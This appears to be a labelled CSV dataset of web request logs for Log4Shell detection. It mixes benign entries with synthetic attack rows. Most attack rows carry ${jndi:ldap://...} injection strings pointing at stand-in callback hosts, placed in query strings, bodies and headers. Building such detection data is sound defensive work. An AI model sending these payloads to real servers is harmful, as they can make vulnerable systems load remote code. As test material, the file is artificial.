id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000390,2026-05-17,synthetic,GET /search?q=User-Agent: ${jndi:ldap://attacker.evil.com/header} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=user-agent: ${jndi:ldap://attacker.evil.com/header} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,plain,path,val,critical
LS-000391,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=User-Agent: ${jndi:ldap://attacker.evil.com/header},post /search http/1.1 host: app.local body: query=user-agent: ${jndi:ldap://attacker.evil.com/header},1,log4shell,plain,body,val,critical
LS-000392,2026-05-17,synthetic,GET /?q=User-Agent: ${jndi:ldap://attacker.evil.com/header} HTTP/1.1,get /?q=user-agent: ${jndi:ldap://attacker.evil.com/header} http/1.1,1,log4shell,plain,minimal_query,val,critical
LS-000393,2026-05-17,synthetic,GET /api/check?debug=User-Agent: ${jndi:ldap://attacker.evil.com/header} HTTP/1.1 Host: app.local,get /api/check?debug=user-agent: ${jndi:ldap://attacker.evil.com/header} http/1.1 host: app.local,1,log4shell,plain,uri_param,val,critical
LS-000394,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://attacker.evil.com/header} | Method: GET | Host: app.local | Path: /home,request from user-agent: user-agent: ${jndi:ldap://attacker.evil.com/header} | method: get | host: app.local | path: /home,1,log4shell,plain,user_agent,val,critical
LS-000395,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://attacker.evil.com/header},request from user-agent: user-agent: ${jndi:ldap://attacker.evil.com/header},1,log4shell,plain,user_agent_minimal,val,critical
LS-000396,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: User-Agent: ${jndi:ldap://attacker.evil.com/header},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /metrics | x-api-version: user-agent: ${jndi:ldap://attacker.evil.com/header},1,log4shell,plain,x_api_version,val,critical
LS-000589,2026-05-17,synthetic,GET /?q=User-Agent: ${jndi:ldap://log4j-test.invalid/header} HTTP/1.1,get /?q=user-agent: ${jndi:ldap://log4j-test.invalid/header} http/1.1,1,log4shell,plain,minimal_query,val,critical
LS-000590,2026-05-17,synthetic,GET /api/check?debug=User-Agent: ${jndi:ldap://log4j-test.invalid/header} HTTP/1.1 Host: app.local,get /api/check?debug=user-agent: ${jndi:ldap://log4j-test.invalid/header} http/1.1 host: app.local,1,log4shell,plain,uri_param,val,critical
LS-000591,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://log4j-test.invalid/header} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: user-agent: ${jndi:ldap://log4j-test.invalid/header} | method: get | host: app.local | path: /search?q=boots,1,log4shell,plain,user_agent,val,critical
LS-000592,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://log4j-test.invalid/header},request from user-agent: user-agent: ${jndi:ldap://log4j-test.invalid/header},1,log4shell,plain,user_agent_minimal,val,critical
LS-000593,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: / | X-Api-Version: User-Agent: ${jndi:ldap://log4j-test.invalid/header},request from user-agent: java/11.0.13 | method: get | host: app.local | path: / | x-api-version: user-agent: ${jndi:ldap://log4j-test.invalid/header},1,log4shell,plain,x_api_version,val,critical
LS-000594,2026-05-17,synthetic,GET /search?q=User-Agent: ${jndi:ldap://log4j-test.invalid/header} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=user-agent: ${jndi:ldap://log4j-test.invalid/header} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,plain,path,val,critical
LS-000595,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=User-Agent: ${jndi:ldap://log4j-test.invalid/header},post /search http/1.1 host: app.local body: query=user-agent: ${jndi:ldap://log4j-test.invalid/header},1,log4shell,plain,body,val,critical
LS-000596,2026-05-17,synthetic,GET /?q=User-Agent: ${jndi:ldap://log4j-test.invalid/header} HTTP/1.1,get /?q=user-agent: ${jndi:ldap://log4j-test.invalid/header} http/1.1,1,log4shell,plain,minimal_query,val,critical
LS-000597,2026-05-17,synthetic,GET /api/check?debug=User-Agent: ${jndi:ldap://log4j-test.invalid/header} HTTP/1.1 Host: app.local,get /api/check?debug=user-agent: ${jndi:ldap://log4j-test.invalid/header} http/1.1 host: app.local,1,log4shell,plain,uri_param,val,critical
LS-000598,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://log4j-test.invalid/header} | Method: GET | Host: app.local | Path: /home,request from user-agent: user-agent: ${jndi:ldap://log4j-test.invalid/header} | method: get | host: app.local | path: /home,1,log4shell,plain,user_agent,val,critical
LS-000599,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://log4j-test.invalid/header},request from user-agent: user-agent: ${jndi:ldap://log4j-test.invalid/header},1,log4shell,plain,user_agent_minimal,val,critical
LS-000600,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: / | X-Api-Version: User-Agent: ${jndi:ldap://log4j-test.invalid/header},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: / | x-api-version: user-agent: ${jndi:ldap://log4j-test.invalid/header},1,log4shell,plain,x_api_version,val,critical
LS-000793,2026-05-17,synthetic,GET /?q=User-Agent: ${jndi:ldap://callback.local/header} HTTP/1.1,get /?q=user-agent: ${jndi:ldap://callback.local/header} http/1.1,1,log4shell,plain,minimal_query,val,critical
LS-000794,2026-05-17,synthetic,GET /api/check?debug=User-Agent: ${jndi:ldap://callback.local/header} HTTP/1.1 Host: app.local,get /api/check?debug=user-agent: ${jndi:ldap://callback.local/header} http/1.1 host: app.local,1,log4shell,plain,uri_param,val,critical
LS-000795,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://callback.local/header} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: user-agent: ${jndi:ldap://callback.local/header} | method: get | host: app.local | path: /search?q=boots,1,log4shell,plain,user_agent,val,critical
LS-000796,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://callback.local/header},request from user-agent: user-agent: ${jndi:ldap://callback.local/header},1,log4shell,plain,user_agent_minimal,val,critical
LS-000797,2026-05-17,synthetic,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: User-Agent: ${jndi:ldap://callback.local/header},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /static/app.js | x-api-version: user-agent: ${jndi:ldap://callback.local/header},1,log4shell,plain,x_api_version,val,critical
LS-000798,2026-05-17,synthetic,GET /search?q=User-Agent: ${jndi:ldap://callback.local/header} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=user-agent: ${jndi:ldap://callback.local/header} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,log4shell,plain,path,val,critical
LS-000799,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=User-Agent: ${jndi:ldap://callback.local/header},post /search http/1.1 host: app.local body: query=user-agent: ${jndi:ldap://callback.local/header},1,log4shell,plain,body,val,critical
LS-000800,2026-05-17,synthetic,GET /?q=User-Agent: ${jndi:ldap://callback.local/header} HTTP/1.1,get /?q=user-agent: ${jndi:ldap://callback.local/header} http/1.1,1,log4shell,plain,minimal_query,val,critical
LS-000801,2026-05-17,synthetic,GET /api/check?debug=User-Agent: ${jndi:ldap://callback.local/header} HTTP/1.1 Host: app.local,get /api/check?debug=user-agent: ${jndi:ldap://callback.local/header} http/1.1 host: app.local,1,log4shell,plain,uri_param,val,critical
LS-000802,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://callback.local/header} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: user-agent: ${jndi:ldap://callback.local/header} | method: get | host: app.local | path: /search?q=boots,1,log4shell,plain,user_agent,val,critical
LS-000803,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://callback.local/header},request from user-agent: user-agent: ${jndi:ldap://callback.local/header},1,log4shell,plain,user_agent_minimal,val,critical
LS-000804,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: User-Agent: ${jndi:ldap://callback.local/header},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /static/app.js | x-api-version: user-agent: ${jndi:ldap://callback.local/header},1,log4shell,plain,x_api_version,val,critical
LS-000997,2026-05-17,synthetic,GET /?q=User-Agent: ${jndi:ldap://probe.example.net/header} HTTP/1.1,get /?q=user-agent: ${jndi:ldap://probe.example.net/header} http/1.1,1,log4shell,plain,minimal_query,val,critical
LS-000998,2026-05-17,synthetic,GET /api/check?debug=User-Agent: ${jndi:ldap://probe.example.net/header} HTTP/1.1 Host: app.local,get /api/check?debug=user-agent: ${jndi:ldap://probe.example.net/header} http/1.1 host: app.local,1,log4shell,plain,uri_param,val,critical
LS-000999,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://probe.example.net/header} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: user-agent: ${jndi:ldap://probe.example.net/header} | method: get | host: app.local | path: /static/app.js,1,log4shell,plain,user_agent,val,critical
LS-001000,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://probe.example.net/header},request from user-agent: user-agent: ${jndi:ldap://probe.example.net/header},1,log4shell,plain,user_agent_minimal,val,critical
LS-001001,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: User-Agent: ${jndi:ldap://probe.example.net/header},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /search?q=boots | x-api-version: user-agent: ${jndi:ldap://probe.example.net/header},1,log4shell,plain,x_api_version,val,critical
LS-001002,2026-05-17,synthetic,GET /search?q=User-Agent: ${jndi:ldap://probe.example.net/header} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=user-agent: ${jndi:ldap://probe.example.net/header} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,plain,path,val,critical
LS-001003,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=User-Agent: ${jndi:ldap://probe.example.net/header},post /search http/1.1 host: app.local body: query=user-agent: ${jndi:ldap://probe.example.net/header},1,log4shell,plain,body,val,critical
LS-001004,2026-05-17,synthetic,GET /?q=User-Agent: ${jndi:ldap://probe.example.net/header} HTTP/1.1,get /?q=user-agent: ${jndi:ldap://probe.example.net/header} http/1.1,1,log4shell,plain,minimal_query,val,critical
LS-001005,2026-05-17,synthetic,GET /api/check?debug=User-Agent: ${jndi:ldap://probe.example.net/header} HTTP/1.1 Host: app.local,get /api/check?debug=user-agent: ${jndi:ldap://probe.example.net/header} http/1.1 host: app.local,1,log4shell,plain,uri_param,val,critical
LS-001006,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://probe.example.net/header} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: user-agent: ${jndi:ldap://probe.example.net/header} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,plain,user_agent,val,critical
LS-001007,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://probe.example.net/header},request from user-agent: user-agent: ${jndi:ldap://probe.example.net/header},1,log4shell,plain,user_agent_minimal,val,critical
LS-001008,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: User-Agent: ${jndi:ldap://probe.example.net/header},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: / | x-api-version: user-agent: ${jndi:ldap://probe.example.net/header},1,log4shell,plain,x_api_version,val,critical
LS-001201,2026-05-17,synthetic,GET /?q=User-Agent: ${jndi:ldap://lab-callback.example.org/header} HTTP/1.1,get /?q=user-agent: ${jndi:ldap://lab-callback.example.org/header} http/1.1,1,log4shell,plain,minimal_query,val,critical
LS-001202,2026-05-17,synthetic,GET /api/check?debug=User-Agent: ${jndi:ldap://lab-callback.example.org/header} HTTP/1.1 Host: app.local,get /api/check?debug=user-agent: ${jndi:ldap://lab-callback.example.org/header} http/1.1 host: app.local,1,log4shell,plain,uri_param,val,critical
LS-001203,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://lab-callback.example.org/header} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: user-agent: ${jndi:ldap://lab-callback.example.org/header} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,plain,user_agent,val,critical
LS-001204,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://lab-callback.example.org/header},request from user-agent: user-agent: ${jndi:ldap://lab-callback.example.org/header},1,log4shell,plain,user_agent_minimal,val,critical
LS-001205,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: User-Agent: ${jndi:ldap://lab-callback.example.org/header},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /metrics | x-api-version: user-agent: ${jndi:ldap://lab-callback.example.org/header},1,log4shell,plain,x_api_version,val,critical
LS-001206,2026-05-17,synthetic,GET /search?q=User-Agent: ${jndi:ldap://lab-callback.example.org/header} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=user-agent: ${jndi:ldap://lab-callback.example.org/header} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,plain,path,val,critical
LS-001207,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=User-Agent: ${jndi:ldap://lab-callback.example.org/header},post /search http/1.1 host: app.local body: query=user-agent: ${jndi:ldap://lab-callback.example.org/header},1,log4shell,plain,body,val,critical
LS-001208,2026-05-17,synthetic,GET /?q=User-Agent: ${jndi:ldap://lab-callback.example.org/header} HTTP/1.1,get /?q=user-agent: ${jndi:ldap://lab-callback.example.org/header} http/1.1,1,log4shell,plain,minimal_query,val,critical
LS-001209,2026-05-17,synthetic,GET /api/check?debug=User-Agent: ${jndi:ldap://lab-callback.example.org/header} HTTP/1.1 Host: app.local,get /api/check?debug=user-agent: ${jndi:ldap://lab-callback.example.org/header} http/1.1 host: app.local,1,log4shell,plain,uri_param,val,critical
LS-001210,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://lab-callback.example.org/header} | Method: GET | Host: app.local | Path: /login,request from user-agent: user-agent: ${jndi:ldap://lab-callback.example.org/header} | method: get | host: app.local | path: /login,1,log4shell,plain,user_agent,val,critical
LS-001211,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://lab-callback.example.org/header},request from user-agent: user-agent: ${jndi:ldap://lab-callback.example.org/header},1,log4shell,plain,user_agent_minimal,val,critical
LS-001212,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /login | X-Api-Version: User-Agent: ${jndi:ldap://lab-callback.example.org/header},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /login | x-api-version: user-agent: ${jndi:ldap://lab-callback.example.org/header},1,log4shell,plain,x_api_version,val,critical
LS-002813,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002814,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,val,low
LS-002815,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,val,low
LS-002816,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,val,low
LS-002817,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,val,low
LS-002818,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,val,low
LS-002819,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,val,low
LS-002820,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002821,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002822,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,val,low
LS-002823,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,val,low
LS-002824,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,val,low
LS-002825,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,val,low
LS-002826,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,val,low
LS-002827,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,val,low
LS-002828,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,val,low
LS-002829,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,val,low
LS-002830,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002831,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,val,low
LS-002832,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002833,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,val,low
LS-002834,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002835,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,val,low
LS-002836,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,val,low
LS-002837,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002838,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,val,low
LS-002839,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002840,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,val,low
LS-002841,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,val,low
LS-002842,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,val,low
LS-002843,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002844,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,val,low
LS-002845,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,val,low
LS-002846,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,val,low
LS-002847,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,val,low
LS-002848,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002849,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002850,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,val,low
LS-002851,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,val,low
LS-002852,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,val,low
LS-002853,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002854,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,val,low
LS-002855,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002856,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,val,low
LS-002857,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,val,low
LS-002858,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,val,low
LS-002859,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,val,low
LS-002860,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,val,low
LS-002861,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,val,low
LS-002862,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,val,low
LS-002863,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,val,low
LS-002864,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,val,low
LS-002865,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,val,low
LS-002866,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,val,low
LS-002867,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,val,low
